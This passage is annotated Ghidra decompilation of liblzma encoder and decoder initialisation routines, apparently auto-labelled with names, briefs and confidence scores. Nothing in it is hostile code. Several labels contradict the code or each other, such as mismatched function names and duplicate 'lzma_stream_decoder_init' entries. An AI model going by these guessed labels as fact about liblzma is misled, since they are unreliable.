                      (*(undefined8 *)(param_1 + 0x38),*(undefined8 *)(param_1 + 0x30),param_2,
                       lzma_encoder_find_by_id,1);
    if ((int)uVar2 == 0) {
      lVar1 = *(long *)(param_1 + 0x38);
      *(undefined2 *)(lVar1 + 0x60) = 0x101;
      *(undefined1 *)(lVar1 + 99) = 1;
      return uVar2;
    }
    lzma_end(param_1);
    uVar2 = uVar2 & 0xffffffff;
  }
  return uVar2;
}



/**
 * @name  lzma_index_encoder_init_coder
 * @brief Initializes index encoder internal coder with iterator, allocates 0x150-byte state.
 * @confidence 80%
 * @classification init
 * @address 0x0010b9d0
 */

/* Initializes index encoder internal coder with iterator */

undefined8 lzma_index_encoder_init_coder(undefined8 *param_1,undefined8 param_2,long param_3)

{
  undefined4 *puVar1;
  
  if ((code *)param_1[2] != lzma_index_encoder_init_coder) {
    lzma_next_coder_end();
  }
  param_1[2] = lzma_index_encoder_init_coder;
  if (param_3 != 0) {
    puVar1 = (undefined4 *)*param_1;
    if (puVar1 == (undefined4 *)0x0) {
      puVar1 = (undefined4 *)lzma_alloc(0x150,param_2);
      *param_1 = puVar1;
      if (puVar1 == (undefined4 *)0x0) {
        return 5;
      }
      param_1[3] = lzma_index_encoder_encode;
      param_1[4] = lzma_free;
    }
    lzma_index_iter_init(puVar1 + 4,param_3);
    *puVar1 = 0;
    *(long *)(puVar1 + 2) = param_3;
    *(undefined8 *)(puVar1 + 0x50) = 0;
    puVar1[0x52] = 0;
    return 0;
  }
  return 0xb;
}



/**
 * @name  lzma_stream_encoder_init
 * @brief Initializes LZMA stream encoder: allocates 0x5e0-byte state, sets up encode/cleanup function pointers, creates index, encodes stream header, sets up block filters.
 * @confidence 92%
 * @classification init
 * @address 0x0010c410
 */

/* Initializes an LZMA stream encoder: allocates the encoder state structure (0x5e0 bytes), sets up
   function pointers for encoding/cleanup, initializes an index, encodes the stream header, and sets
   up block filters. */

undefined8
lzma_stream_encoder_init(undefined8 *param_1,undefined8 param_2,long param_3,undefined4 param_4)

{
  long lVar1;
  long uVar2;
  undefined4 *puVar3;
  long in_FS_OFFSET;
  undefined1 local_68 [16];
  undefined4 local_58;
  undefined1 auStack_54 [12];
  undefined1 local_48 [16];
  undefined8 local_38;
  long local_30;
  
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  if ((code *)param_1[2] != lzma_stream_encoder_init) {
    lzma_next_coder_end();
  }
  param_1[2] = lzma_stream_encoder_init;
  if (param_3 == 0) {
    uVar2 = 0xb;
    goto LAB_0010c4d0;
  }
  puVar3 = (undefined4 *)*param_1;
  if (puVar3 == (undefined4 *)0x0) {
    puVar3 = (undefined4 *)lzma_alloc(0x5e0,param_2);
    if (puVar3 != (undefined4 *)0x0) {
      *param_1 = puVar3;
      uVar2 = 0;
      param_1[3] = lzma_stream_encode;
      param_1[4] = lzma_stream_decoder_end_full_2;
      param_1[8] = lzma_block_filters_setup;
      *(undefined1 (*) [16])(puVar3 + 2) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar3 + 0x5e) = (undefined1  [16])0x0;
      *(undefined8 *)(puVar3 + 0x4a) = 0xffffffffffffffff;
      *(undefined8 *)(puVar3 + 4) = 0xffffffffffffffff;
      *(undefined8 *)(puVar3 + 0x60) = 0xffffffffffffffff;
      *(undefined8 *)(puVar3 + 0x72) = 0;
      *(undefined1 (*) [16])(puVar3 + 6) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar3 + 10) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar3 + 0xe) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar3 + 0x12) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar3 + 0x62) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar3 + 0x66) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar3 + 0x6a) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar3 + 0x6e) = (undefined1  [16])0x0;
      goto LAB_0010c46d;
    }
  }
  else {
    uVar2 = *(undefined8 *)(puVar3 + 0x72);
LAB_0010c46d:
    *puVar3 = 0;
    puVar3[0x16] = 0;
    puVar3[0x18] = param_4;
    lzma_index_end(uVar2,param_2);
    lVar1 = lzma_index_init(param_2);
    *(long *)(puVar3 + 0x72) = lVar1;
    if (lVar1 != 0) {
      local_38 = 0;
      local_68 = (undefined1  [16])0x0;
      auStack_54 = SUB1612((undefined1  [16])0x0,4);
      local_58 = param_4;
      local_48 = (undefined1  [16])0x0;
      uVar2 = lzma_stream_header_encode(local_68,puVar3 + 0x78);
      if ((int)uVar2 == 0) {
        *(undefined8 *)(puVar3 + 0x74) = 0;
        *(undefined8 *)(puVar3 + 0x76) = 0xc;
        uVar2 = lzma_block_filters_setup(puVar3,param_2,param_3,0);
      }
      goto LAB_0010c4d0;
    }
  }
  uVar2 = 5;
LAB_0010c4d0:
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_stream_encoder
 * @brief Public API for initializing XZ stream encoder with filter chain and check type.
 * @confidence 92%
 * @classification init
 * @address 0x0010c5f0
 */

/* Public API for initializing XZ stream encoder */

ulong lzma_stream_encoder_api(long param_1,undefined8 param_2,undefined4 param_3)

{
  long lVar1;
  ulong uVar2;
  
  uVar2 = lzma_filter_decoder_initialize();
  if ((int)uVar2 == 0) {
    uVar2 = lzma_stream_encoder_init
                      (*(undefined8 *)(param_1 + 0x38),*(undefined8 *)(param_1 + 0x30),param_2,
                       param_3);
    if ((int)uVar2 == 0) {
      lVar1 = *(long *)(param_1 + 0x38);
      *(undefined4 *)(lVar1 + 0x60) = 0x1010101;
      *(undefined1 *)(lVar1 + 100) = 1;
      return uVar2;
    }
    lzma_end(param_1);
    uVar2 = uVar2 & 0xffffffff;
  }
  return uVar2;
}



/**
 * @name  lzma_stream_encoder_mt_init_coder
 * @brief Initializes multi-threaded LZMA stream encoder. Sets up mutexes, condition variables (CLOCK_MONOTONIC support), allocates worker thread structures, copies filter chains, creates index, encodes stream header.
 * @confidence 82%
 * @classification init
 * @address 0x0010d240
 */

/* Initializes a multi-threaded LZMA stream encoder. Sets up mutexes, condition variables (with
   CLOCK_MONOTONIC support), allocates worker thread structures, copies filter chains, creates an
   index, and encodes the stream header. */

int lzma_stream_encoder_mt_init(undefined8 *param_1,undefined8 param_2,long param_3)

{
  uint uVar1;
  undefined4 uVar2;
  char cVar3;
  int iVar4;
  long lVar5;
  undefined4 *puVar6;
  long in_FS_OFFSET;
  undefined8 local_140;
  undefined8 local_138;
  undefined8 local_130;
  timespec local_128;
  pthread_condattr_t local_10c;
  undefined1 local_108 [200];
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  if ((code *)param_1[2] != lzma_stream_encoder_mt_init) {
    lzma_next_coder_end();
  }
  param_1[2] = lzma_stream_encoder_mt_init;
  iVar4 = lzma_mt_block_params_validate(param_3,local_108,&local_140,&local_138,&local_130);
  if (iVar4 != 0) goto LAB_0010d468;
  lVar5 = lzma_raw_encoder_memusage(local_140);
  if (lVar5 == -1) {
    iVar4 = 8;
    goto LAB_0010d468;
  }
  if (0xf < *(uint *)(param_3 + 0x20)) {
    iVar4 = 0xb;
    goto LAB_0010d468;
  }
  cVar3 = lzma_check_is_supported();
  if (cVar3 == '\0') {
    iVar4 = 3;
    goto LAB_0010d468;
  }
  puVar6 = (undefined4 *)*param_1;
  if (puVar6 == (undefined4 *)0x0) {
    puVar6 = (undefined4 *)lzma_alloc(0x238);
    if (puVar6 != (undefined4 *)0x0) {
      *param_1 = puVar6;
      iVar4 = pthread_mutex_init((pthread_mutex_t *)(puVar6 + 0x76),(pthread_mutexattr_t *)0x0);
      if (iVar4 == 0) {
        iVar4 = clock_gettime(1,&local_128);
        if (iVar4 == 0) {
          iVar4 = pthread_condattr_init(&local_10c);
          if (iVar4 != 0) goto LAB_0010d56c;
          iVar4 = pthread_condattr_setclock(&local_10c,1);
          if (iVar4 != 0) {
            pthread_condattr_destroy(&local_10c);
            goto LAB_0010d56c;
          }
          iVar4 = pthread_cond_init((pthread_cond_t *)(puVar6 + 0x80),&local_10c);
          pthread_condattr_destroy(&local_10c);
          if (iVar4 != 0) goto LAB_0010d56c;
          puVar6[0x8c] = 1;
        }
        else {
LAB_0010d56c:
          puVar6[0x8c] = 0;
          iVar4 = pthread_cond_init((pthread_cond_t *)(puVar6 + 0x80),(pthread_condattr_t *)0x0);
          if (iVar4 != 0) {
            pthread_mutex_destroy((pthread_mutex_t *)(puVar6 + 0x76));
            goto LAB_0010d4a8;
          }
        }
        param_1[3] = lzma_stream_encoder_mt_encode;
        param_1[4] = lzma_decoder_cleanup;
        param_1[5] = FUN_0010c8c0;
        param_1[8] = lzma_encoder_set_filters;
        *(undefined1 (*) [16])(puVar6 + 0x2e) = (undefined1  [16])0x0;
        *(undefined8 *)(puVar6 + 4) = 0xffffffffffffffff;
        *(undefined8 *)(puVar6 + 0x18) = 0xffffffffffffffff;
        *(undefined8 *)(puVar6 + 0x30) = 0xffffffffffffffff;
        *(undefined8 *)(puVar6 + 0x2c) = 0;
        *(undefined8 *)(puVar6 + 0x6a) = 0;
        *(undefined8 *)(puVar6 + 0x6c) = 0;
        *(undefined1 (*) [16])(puVar6 + 0x32) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar6 + 0x36) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar6 + 0x3a) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar6 + 0x3e) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar6 + 0x56) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar6 + 0x5a) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar6 + 0x5e) = (undefined1  [16])0x0;
        *(undefined1 (*) [16])(puVar6 + 0x62) = (undefined1  [16])0x0;
        iVar4 = 0;
        goto LAB_0010d2ee;
      }
LAB_0010d4a8:
      lzma_free(puVar6,param_2);
      *param_1 = 0;
    }
  }
  else {
    iVar4 = puVar6[0x6c];
LAB_0010d2ee:
    *puVar6 = 0;
    puVar6[0x69] = 0;
    *(undefined8 *)(puVar6 + 2) = local_138;
    *(undefined8 *)(puVar6 + 0x70) = 0;
    *(undefined8 *)(puVar6 + 0x66) = local_130;
    if (*(int *)(param_3 + 4) == iVar4) {
      signal_and_wait_worker_threads(puVar6,1);
      uVar2 = *(undefined4 *)(param_3 + 4);
    }
    else {
      FUN_0010d160(puVar6 + 0x6a,puVar6 + 0x6d,param_2);
      *(undefined8 *)(puVar6 + 0x6c) = 0;
      uVar1 = *(uint *)(param_3 + 4);
      *(undefined8 *)(puVar6 + 0x6a) = 0;
      *(undefined8 *)(puVar6 + 0x6e) = 0;
      lVar5 = lzma_alloc((ulong)uVar1 * 0x220,param_2);
      *(long *)(puVar6 + 0x6a) = lVar5;
      if (lVar5 == 0) goto LAB_0010d4ba;
      uVar2 = *(undefined4 *)(param_3 + 4);
      puVar6[0x6c] = uVar2;
    }
    iVar4 = lzma_outq_reset(puVar6 + 0x56,param_2,uVar2);
    if (iVar4 != 0) goto LAB_0010d468;
    puVar6[0x68] = *(undefined4 *)(param_3 + 0x10);
    lzma_filters_free(puVar6 + 4,param_2);
    lzma_filters_free(puVar6 + 0x18,param_2);
    iVar4 = lzma_filters_copy(local_140,puVar6 + 4,param_2);
    if (iVar4 != 0) goto LAB_0010d468;
    lzma_index_end(*(undefined8 *)(puVar6 + 0x2c),param_2);
    lVar5 = lzma_index_init(param_2);
    *(long *)(puVar6 + 0x2c) = lVar5;
    if (lVar5 != 0) {
      uVar2 = *(undefined4 *)(param_3 + 0x20);
      puVar6[0x42] = 0;
      puVar6[0x46] = uVar2;
      iVar4 = lzma_stream_header_encode(puVar6 + 0x42,puVar6 + 0x50);
      if (iVar4 == 0) {
        *(undefined8 *)(puVar6 + 0x54) = 0;
        *(undefined8 *)(puVar6 + 0x72) = 0;
        *(undefined8 *)(puVar6 + 0x74) = 0xc;
      }
      goto LAB_0010d468;
    }
  }
LAB_0010d4ba:
  iVar4 = 5;
LAB_0010d468:
  if (local_40 == *(long *)(in_FS_OFFSET + 0x28)) {
    return iVar4;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_stream_encoder_mt
 * @brief Public API for initializing multi-threaded LZMA stream encoder. Sets multiple state flags on success.
 * @confidence 92%
 * @classification init
 * @address 0x0010e230
 */

/* Initializes multi-threaded LZMA stream encoder */

ulong lzma_stream_encoder_mt(long param_1,undefined8 param_2)

{
  long lVar1;
  ulong uVar2;
  
  uVar2 = lzma_filter_decoder_initialize();
  if ((int)uVar2 == 0) {
    uVar2 = lzma_stream_encoder_mt_init
                      (*(undefined8 *)(param_1 + 0x38),*(undefined8 *)(param_1 + 0x30),param_2);
    if ((int)uVar2 == 0) {
      lVar1 = *(long *)(param_1 + 0x38);
      *(undefined1 *)(lVar1 + 0x60) = 1;
      *(undefined2 *)(lVar1 + 0x62) = 0x101;
      *(undefined1 *)(lVar1 + 100) = 1;
      return uVar2;
    }
    lzma_end(param_1);
    uVar2 = uVar2 & 0xffffffff;
  }
  return uVar2;
}



/**
 * @name  lzma_lzma2_encoder_init_wrapper
 * @brief Initializes LZMA2 encoder filter: allocates 0x58-byte state, encodes lclppb, delegates to inner encoder init.
 * @confidence 60%
 * @classification init
 * @address 0x0010e490
 */

/* Initializes a filter/hash decoder. Allocates 0x58 bytes for filter state if needed, sets up
   decoder function pointers, and initializes hash state. */

undefined8 hash_algorithm_init(undefined8 *param_1,undefined8 param_2,undefined8 param_3)

{
  char cVar1;
  undefined8 uVar2;
  undefined1 (*pauVar3) [16];
  long in_FS_OFFSET;
  undefined8 local_68;
  code *local_60;
  undefined8 local_58;
  undefined1 local_50 [16];
  undefined8 local_40;
  long local_30;
  
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  if ((code *)param_1[2] != hash_algorithm_init) {
    lzma_next_coder_end();
  }
  param_1[2] = hash_algorithm_init;
  pauVar3 = (undefined1 (*) [16])*param_1;
  if (pauVar3 == (undefined1 (*) [16])0x0) {
    pauVar3 = (undefined1 (*) [16])lzma_alloc(0x58,param_2);
    if (pauVar3 == (undefined1 (*) [16])0x0) {
      uVar2 = 5;
      goto LAB_0010e52d;
    }
    *param_1 = pauVar3;
    param_1[3] = lzma_filter_decode_process;
    param_1[4] = lzma_next_end_and_free;
    *pauVar3 = (undefined1  [16])0x0;
    pauVar3[1] = (undefined1  [16])0x0;
    *(undefined8 *)(*pauVar3 + 8) = 0xffffffffffffffff;
    pauVar3[2] = (undefined1  [16])0x0;
    pauVar3[3] = (undefined1  [16])0x0;
    pauVar3[4] = (undefined1  [16])0x0;
  }
  cVar1 = lzma_lzma_lclppb_encode(param_3,pauVar3 + 5);
  uVar2 = 8;
  if (cVar1 == '\0') {
    local_68 = 0x4000000000000001;
    local_40 = 0;
    local_60 = FUN_0011a760;
    local_50 = (undefined1  [16])0x0;
    local_58 = param_3;
    uVar2 = set_filter_and_init(pauVar3,param_2,&local_68);
  }
LAB_0010e52d:
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar2;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}



/**
 * @name  lzma_microlzma_encoder
 * @brief Public API: Initializes MicroLZMA encoder, sets internal flag on success
 * @confidence 80%
 * @classification init
 * @address 0x0010e5f0
 */

/* Public API: Initialize MicroLZMA encoder */

ulong lzma_microlzma_encoder(long param_1,undefined8 param_2)

{
  ulong uVar1;
  
  uVar1 = lzma_filter_decoder_initialize();
  if ((int)uVar1 == 0) {
    uVar1 = hash_algorithm_init(*(undefined8 *)(param_1 + 0x38),*(undefined8 *)(param_1 + 0x30),
                                param_2);
    if ((int)uVar1 == 0) {
      *(undefined1 *)(*(long *)(param_1 + 0x38) + 99) = 1;
      return uVar1;
    }
    lzma_end(param_1);
    uVar1 = uVar1 & 0xffffffff;
  }
  return uVar1;
}



/**
 * @name  lzma_alone_decoder_coder_init
 * @brief Initializes LZMA alone decoder coder with 0xe8-byte state, function pointers, and memory limit config.
 * @confidence 78%
 * @classification init
 * @address 0x0010e690
 */

/* Initializes an LZMA2 decoder structure. Allocates decoder state if needed, sets up function
   pointers (lzma2_decode, init_and_process), and initializes internal state variables. */

undefined8
lzma2_decoder_init(undefined8 *param_1,undefined8 param_2,long param_3,undefined1 param_4)

{
  undefined1 (*pauVar1) [16];
  
  if ((code *)param_1[2] != lzma2_decoder_init) {
    lzma_next_coder_end();
  }
  pauVar1 = (undefined1 (*) [16])*param_1;
  param_1[2] = lzma2_decoder_init;
  if (pauVar1 == (undefined1 (*) [16])0x0) {
    pauVar1 = (undefined1 (*) [16])lzma_alloc(0xe8,param_2);
    if (pauVar1 == (undefined1 (*) [16])0x0) {
      return 5;
    }
    *param_1 = pauVar1;
    param_1[3] = lzma2_decode;
    param_1[4] = lzma_next_end_and_free_1;
    param_1[7] = lzma_lzma2_decoder_memlimit;
    *pauVar1 = (undefined1  [16])0x0;
    pauVar1[1] = (undefined1  [16])0x0;
    *(undefined8 *)(*pauVar1 + 8) = 0xffffffffffffffff;
    pauVar1[2] = (undefined1  [16])0x0;
    pauVar1[3] = (undefined1  [16])0x0;
    pauVar1[4] = (undefined1  [16])0x0;
  }
  pauVar1[5][4] = param_4;
  if (param_3 == 0) {
    param_3 = 1;
  }
  *(undefined4 *)pauVar1[5] = 0;
  *(undefined8 *)(pauVar1[5] + 8) = 0;
  *(undefined4 *)(pauVar1[7] + 8) = 0;
  *(undefined8 *)pauVar1[8] = 0;
  *(undefined4 *)(pauVar1[8] + 8) = 0;
  *(undefined8 *)pauVar1[6] = 0;
  *(long *)(pauVar1[6] + 8) = param_3;
  *(undefined8 *)pauVar1[7] = 0x8000;
  return 0;
}



/**
 * @name  lzma_alone_decoder
 * @brief Public API for .lzma format decoder initialization.
 * @confidence 92%
 * @classification init
 * @address 0x0010ea80
 */

/* Initializes an LZMA decoder in the 'alone' format. Sets up the decoder state and marks certain
   flags in the internal state structure. */

ulong lzma_alone_decoder(long param_1,undefined8 param_2)

{
  long lVar1;
  ulong uVar2;
  
  uVar2 = lzma_filter_decoder_initialize();
  if ((int)uVar2 == 0) {
    uVar2 = lzma2_decoder_init(*(undefined8 *)(param_1 + 0x38),*(undefined8 *)(param_1 + 0x30),
                               param_2,0);
    if ((int)uVar2 == 0) {
      lVar1 = *(long *)(param_1 + 0x38);
      *(undefined1 *)(lVar1 + 0x60) = 1;
      *(undefined1 *)(lVar1 + 99) = 1;
      return uVar2;
    }
    lzma_end(param_1);
    uVar2 = uVar2 & 0xffffffff;
  }
  return uVar2;
}



/**
 * @name  lzma_auto_decoder_init
 * @brief Initializes auto-detect decoder: allocates 0x60-byte state, sets up decode/end/memconfig callbacks, configures flags and memlimit.
 * @confidence 78%
 * @classification init
 * @address 0x0010eb70
 */

/* Initializes LZMA stream decoder by allocating 0x60-byte state, setting function pointers, and
   configuring decoder flags */

uint lzma_stream_decoder_init(undefined8 *param_1,undefined8 param_2,long param_3,uint param_4)

{
  undefined1 (*pauVar1) [16];
  
  if ((code *)param_1[2] != lzma_stream_decoder_init) {
    lzma_next_coder_end();
  }
  param_1[2] = lzma_stream_decoder_init;
  if ((param_4 & 0xffffffc0) == 0) {
    pauVar1 = (undefined1 (*) [16])*param_1;
    if (pauVar1 == (undefined1 (*) [16])0x0) {
      pauVar1 = (undefined1 (*) [16])lzma_alloc(0x60,param_2);
      if (pauVar1 == (undefined1 (*) [16])0x0) {
        return 5;
      }
      *param_1 = pauVar1;
      param_1[3] = lzma_stream_decoder_process;
      param_1[4] = lzma_next_end_and_free_2;
      param_1[6] = lzma_simple_coder_get_check;
      param_1[7] = validate_encoder_state;
      *pauVar1 = (undefined1  [16])0x0;
      pauVar1[1] = (undefined1  [16])0x0;
      *(undefined8 *)(*pauVar1 + 8) = 0xffffffffffffffff;
      pauVar1[2] = (undefined1  [16])0x0;
      pauVar1[3] = (undefined1  [16])0x0;
      pauVar1[4] = (undefined1  [16])0x0;
    }
    *(uint *)(pauVar1[5] + 8) = param_4;
    if (param_3 == 0) {
      param_3 = 1;
    }
    *(undefined4 *)(pauVar1[5] + 0xc) = 0;
    *(long *)pauVar1[5] = param_3;
    return param_4 & 0xffffffc0;
  }
  return 8;
}



/**
 * @name  lzma_auto_decoder
 * @brief Initializes automatic format-detecting LZMA decoder that handles .xz, .lzma, etc.
 * @confidence 90%
 * @classification init
 * @address 0x0010ee00
 */

/* Initializes an automatic LZMA decoder that can detect and decode multiple format types */

ulong lzma_auto_decoder(long param_1,undefined8 param_2,undefined4 param_3)

{
  long lVar1;
  ulong uVar2;
  
  uVar2 = lzma_filter_decoder_initialize();
  if ((int)uVar2 == 0) {
    uVar2 = lzma_stream_decoder_init
                      (*(undefined8 *)(param_1 + 0x38),*(undefined8 *)(param_1 + 0x30),param_2,
                       param_3);
    if ((int)uVar2 == 0) {
      lVar1 = *(long *)(param_1 + 0x38);
      *(undefined1 *)(lVar1 + 0x60) = 1;
      *(undefined1 *)(lVar1 + 99) = 1;
      return uVar2;
    }
    lzma_end(param_1);
    uVar2 = uVar2 & 0xffffffff;
  }
  return uVar2;
}



/**
 * @name  lzma_file_info_decoder_init
 * @brief Initializes file info decoder: allocates 0x2160-byte state, sets up decode/end/memconfig callbacks, clears indices.
 * @confidence 75%
 * @classification init
 * @address 0x0010f8a0
 */

/* Initializes an LZMA stream decoder (despite the Ghidra symbol saying encoder, the callbacks
   reference decoder functions). Allocates a large state buffer (0x2160 bytes), cleans up old index
   structures, sets memory limit, flags, and initializes processing state. */

undefined8
lzma_stream_decoder_init
          (undefined8 *param_1,undefined8 param_2,undefined8 param_3,long param_4,long param_5,
          undefined8 param_6)

{
  undefined4 *puVar1;
  undefined8 uVar2;
  
  if ((code *)param_1[2] != lzma_stream_decoder_init) {
    lzma_next_coder_end();
  }
  param_1[2] = lzma_stream_decoder_init;
  if (param_4 != 0) {
    puVar1 = (undefined4 *)*param_1;
    if (puVar1 == (undefined4 *)0x0) {
      puVar1 = (undefined4 *)lzma_alloc(0x2160,param_2);
      if (puVar1 == (undefined4 *)0x0) {
        return 5;
      }
      *param_1 = puVar1;
      uVar2 = 0;
      param_1[3] = lzma_file_info_decoder_decode;
      param_1[4] = lzma_file_info_decoder_end;
      param_1[7] = lzma_decoder_memory_usage;
      *(undefined1 (*) [16])(puVar1 + 8) = (undefined1  [16])0x0;
      *(undefined8 *)(puVar1 + 0x1e) = 0;
      *(undefined8 *)(puVar1 + 10) = 0xffffffffffffffff;
      *(undefined8 *)(puVar1 + 0x22) = 0;
      *(undefined1 (*) [16])(puVar1 + 0xc) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar1 + 0x10) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar1 + 0x14) = (undefined1  [16])0x0;
      *(undefined1 (*) [16])(puVar1 + 0x18) = (undefined1  [16])0x0;
    }
    else {
      uVar2 = *(undefined8 *)(puVar1 + 0x1e);
    }
    *(undefined8 *)(puVar1 + 6) = param_6;
    *puVar1 = 0;
    *(undefined8 *)(puVar1 + 2) = 0;
    *(undefined8 *)(puVar1 + 4) = 0;
    lzma_index_end(uVar2,param_2);
    *(undefined8 *)(puVar1 + 0x1e) = 0;
    lzma_index_end(*(undefined8 *)(puVar1 + 0x22),param_2);
    *(undefined8 *)(puVar1 + 0x22) = 0;
    if (param_5 == 0) {
      param_5 = 1;
    }
    *(long *)(puVar1 + 0x24) = param_4;
    *(undefined8 *)(puVar1 + 0x20) = 0;
    *(undefined8 *)(puVar1 + 0x26) = param_3;
    *(long *)(puVar1 + 0x28) = param_5;
    *(undefined8 *)(puVar1 + 0x54) = 0;
    *(undefined8 *)(puVar1 + 0x56) = 0xc;
    return 0;
  }
  return 0xb;
}



/**
 * @name  lzma_file_info_decoder
 * @brief Initializes file info decoder from LZMA stream for seeking and index extraction.
 * @confidence 85%
 * @classification init
 * @address 0x001102e0
 */

/* Initializes file info decoder from LZMA stream with state flag setting */

ulong lzma_file_info_decoder(long param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  long lVar1;
  ulong uVar2;
  
  uVar2 = lzma_filter_decoder_initialize();
  if ((int)uVar2 == 0) {
    uVar2 = lzma_stream_decoder_init
                      (*(undefined8 *)(param_1 + 0x38),*(undefined8 *)(param_1 + 0x30),
                       param_1 + 0x60,param_2,param_3,param_4);
    if ((int)uVar2 == 0) {
      lVar1 = *(long *)(param_1 + 0x38);
      *(undefined1 *)(lVar1 + 0x60) = 1;
      *(undefined1 *)(lVar1 + 99) = 1;
      return uVar2;
    }
    lzma_end(param_1);
    uVar2 = uVar2 & 0xffffffff;
  }
  return uVar2;
}



/**
 * @name  lzma_raw_decoder_init
 * @brief Wrapper for decoder filter chain initialization via execute_with_mappings
 * @confidence 65%
 * @classification init
 * @address 0x00110600
 */

/* Wrapper that calls execute_with_mappings for decoder filter chain initialization */

void lzma_next_filter_init_decoder(void)

{
  execute_with_mappings();
  return;
}



/**
 * @name  lzma_raw_decoder
 * @brief Initializes raw LZMA decoder with filter chain via execute_with_mappings and lzma_decoder_find_by_id.
 * @confidence 92%
 * @classification init
 * @address 0x00110620
 */

/* Initializes a raw LZMA decoder by setting up decoder state and configuring specific state fields
    */

ulong lzma_raw_decoder(long param_1,undefined8 param_2)

{
  long lVar1;
  ulong uVar2;
  
  uVar2 = lzma_filter_decoder_initialize();
  if ((int)uVar2 == 0) {
    uVar2 = execute_with_mappings
                      (*(undefined8 *)(param_1 + 0x38),*(undefined8 *)(param_1 + 0x30),param_2,
                       lzma_decoder_find_by_id,0);
    if ((int)uVar2 == 0) {
      lVar1 = *(long *)(param_1 + 0x38);
      *(undefined1 *)(lVar1 + 0x60) = 1;
      *(undefined1 *)(lVar1 + 99) = 1;
      return uVar2;
    }
    lzma_end(param_1);
    uVar2 = uVar2 & 0xffffffff;
  }
  return uVar2;
}



/**
 * @name  lzma_index_decoder
 * @brief Public API to initialize LZMA index decoder. Zeroes output index pointer, initializes decoder state.
 * @confidence 92%
 * @classification init
 * @address 0x00110c80
 */

/* Initializes LZMA index decoder */

ulong lzma_index_decoder(long param_1,undefined8 *param_2,undefined8 param_3)

{
  long lVar1;
  ulong uVar2;
  
  if (param_2 != (undefined8 *)0x0) {
    *param_2 = 0;
  }
  uVar2 = lzma_filter_decoder_initialize(param_1);
  if ((int)uVar2 == 0) {
    uVar2 = lzma_index_decoder_new
                      (*(undefined8 *)(param_1 + 0x38),*(undefined8 *)(param_1 + 0x30),param_2,
                       param_3);
    if ((int)uVar2 == 0) {
      lVar1 = *(long *)(param_1 + 0x38);
      *(undefined1 *)(lVar1 + 0x60) = 1;
      *(undefined1 *)(lVar1 + 99) = 1;
      return uVar2;
    }
    lzma_end(param_1);
    uVar2 = uVar2 & 0xffffffff;
  }
  return uVar2;
}



/**
 * @name  lzma_index_hash_init
 * @brief Initializes LZMA index hash structure (0x140 bytes), zeroes field ranges, initializes SHA-256 checks.
 * @confidence 88%
 * @classification init
 * @address 0x00110f10
 */

/* Initializes LZMA index hash structure by allocating 0x140 bytes if needed and zeroing multiple
   field ranges */

undefined4 * lzma_index_hash_init(undefined4 *param_1)

{
  if (param_1 == (undefined4 *)0x0) {
    param_1 = (undefined4 *)lzma_alloc(0x140);
    if (param_1 == (undefined4 *)0x0) {
      return (undefined4 *)0x0;
    }
  }
  *param_1 = 0;
  *(undefined8 *)(param_1 + 2) = 0;
  *(undefined8 *)(param_1 + 4) = 0;
  *(undefined8 *)(param_1 + 6) = 0;
  *(undefined8 *)(param_1 + 8) = 0;
  *(undefined8 *)(param_1 + 0x24) = 0;
  *(undefined8 *)(param_1 + 0x26) = 0;
  *(undefined8 *)(param_1 + 0x28) = 0;
  *(undefined8 *)(param_1 + 0x2a) = 0;
  *(undefined8 *)(param_1 + 0x48) = 0;
  *(undefined8 *)(param_1 + 0x4a) = 0;
  *(undefined8 *)(param_1 + 0x4c) = 0;
  param_1[0x4e] = 0;
  lzma_check_init(param_1 + 10,10);
  lzma_check_init(param_1 + 0x2c,10);
  return param_1;
}



/**
 * @name  lzma_stream_decoder_init
 * @brief Initializes .xz stream decoder: allocates 0x588-byte state, extracts flag bits, initializes index hash, sets state to 0.
 * @confidence 88%
 * @classification init
 * @address 0x00111720
 */

/* Initializes LZMA stream decoder. Validates flags (must fit in 6 bits), allocates 0x588-byte state
   structure, sets up decoder/cleanup callbacks, extracts individual flag bits into separate fields,
   initializes index hash, and sets initial state to 0. */

undefined4
lzma_stream_decoder_init(undefined8 *param_1,undefined8 param_2,long param_3,uint param_4)

{
  long lVar1;
  undefined4 *puVar2;
  undefined8 uVar3;
  
  if ((code *)param_1[2] != lzma_stream_decoder_init) {
    lzma_next_coder_end();
  }
  param_1[2] = lzma_stream_decoder_init;
  if ((param_4 & 0xffffffc0) != 0) {
    return 8;
  }
  puVar2 = (undefined4 *)*param_1;
  if (puVar2 == (undefined4 *)0x0) {
    puVar2 = (undefined4 *)lzma_alloc(0x588,param_2);
    if (puVar2 == (undefined4 *)0x0) {
      return 5;
    }
    *param_1 = puVar2;
    uVar3 = 0;
    param_1[3] = lzma_stream_decoder_decode;
    param_1[4] = lzma_stream_decoder_end_full;
    param_1[6] = FUN_00111690;
    param_1[7] = lzma_stream_decoder_get_check_memlimit;
    *(undefined1 (*) [16])(puVar2 + 2) = (undefined1  [16])0x0;
    *(undefined8 *)(puVar2 + 0x58) = 0;
    *(undefined8 *)(puVar2 + 4) = 0xffffffffffffffff;
